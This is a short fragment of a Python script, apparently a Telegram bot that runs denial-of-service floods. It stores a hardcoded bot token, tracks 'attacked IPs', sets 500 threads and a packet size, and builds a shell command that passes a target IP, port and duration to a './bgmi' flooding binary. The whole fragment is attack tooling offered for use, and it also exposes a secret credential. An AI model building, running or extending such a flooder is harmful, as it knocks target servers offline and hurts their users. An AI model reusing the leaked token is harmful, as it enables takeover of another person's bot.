...
TELEGRAM_BOT_TOKEN = '7116404559:AAHTq7i9gH8GYLiZEQraPm3Vsu3sbbpAUVo'
ALLOWED_USER_ID = 1079846534
bot_access_free = True  

# Store attacked IPs to prevent duplicate attacks
attacked_ips = set()

# Default values for pocket size and thread count
pocket_size = 12
thread_count = 500
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        command = f"./bgmi {ip} {port} {duration} {pocket_size} {thread_count}"
